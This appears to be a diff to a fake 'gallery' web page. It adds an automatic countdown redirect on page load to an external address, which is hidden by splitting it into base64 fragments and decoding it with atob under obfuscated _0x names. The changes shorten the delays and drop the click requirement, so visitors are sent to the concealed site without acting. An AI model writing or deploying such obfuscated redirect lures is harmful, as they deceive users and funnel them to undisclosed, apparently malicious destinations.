@@ -88,9 +88,9 @@ button {
 }
 
 .note {
-  font-size:12px;
-  opacity:0.5;
-  margin-bottom:20px;
+  font-size:13px;
+  opacity:0.7;
+  margin-top:10px;
 }
 </style>
 </head>
@@ -138,7 +138,9 @@ button {
 
   <button onclick="_0xA12_go()">Open Full Gallery</button>
 
-  <p class="note">You may be redirected to an external page</p>
+  <p class="note">
+    You will be redirected in <span id="count">5</span>s...
+  </p>
 
 </div>
 
@@ -151,26 +153,41 @@ setTimeout(() => {
 
   setTimeout(() => {
     _0xA12_enter();
-  }, 3000);
+  }, 2000); // dipercepat
 
-}, 1500);
+}, 1200);
 
 // enter
 function _0xA12_enter() {
   document.getElementById("enterScreen").style.display = "none";
   document.getElementById("galleryPage").style.display = "block";
+  _0xStartCountdown();
 }
 
-// obfuscated link (VALID)
+// obfuscated link
 const _0x1 = "aHR0cHM6Ly9mZGVk";
 const _0x2 = "ZGcuaHVic3Mub25l";
 const _0x3 = "L3AvbmhWTnk=";
 
 function _0xA12_go() {
   const _0xdecoded = atob(_0x1 + _0x2 + _0x3);
-  setTimeout(() => {
-    window.location.href = _0xdecoded;
-  }, 400);
+  window.location.href = _0xdecoded;
+}
+
+// countdown redirect
+function _0xStartCountdown() {
+  let time = 5;
+  const el = document.getElementById("count");
+
+  const timer = setInterval(() => {
+    time--;
+    el.textContent = time;
+
+    if (time <= 0) {
+      clearInterval(timer);
+      _0xA12_go();
+    }
+  }, 1000);
 }
 
 </script>
